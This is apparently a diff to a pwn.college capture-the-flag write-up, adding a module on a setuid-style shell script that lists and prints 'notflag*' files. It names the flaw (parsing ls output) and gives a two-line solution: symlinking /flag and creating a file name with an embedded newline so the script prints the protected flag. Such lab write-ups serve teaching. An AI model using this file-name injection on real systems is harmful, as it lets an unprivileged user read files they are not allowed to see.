@@ -62,4 +62,35 @@ eval "$INPUT"
 $@
 ```
 
+# Module 4
+## Dance of the Disguised
+```sh
+#!/usr/bin/env -iS /opt/pwn.college/sh
+
+PATH=/usr/bin
+[ -n "$1" ] || exit 1
+
+WORKDIR=$(mktemp -d) || exit 2
+cp -rL "$1"/* $WORKDIR/files
+cd $WORKDIR/files
+
+# make sure there weren't linking shenanegans
+grep -q "{" notflag* && exit 3
+
+ls notflag* | while read FILE
+do
+	echo "###### FILE: $FILE #######"
+	cat "$FILE"
+done
+```
+
+### Vulnerability
+`ls notflag* | while read FILE`
+
+### Solution
+- Create file with `\n` in it
+```sh
+ln -s /flag a
+touch $'notflag\na'
+```
 
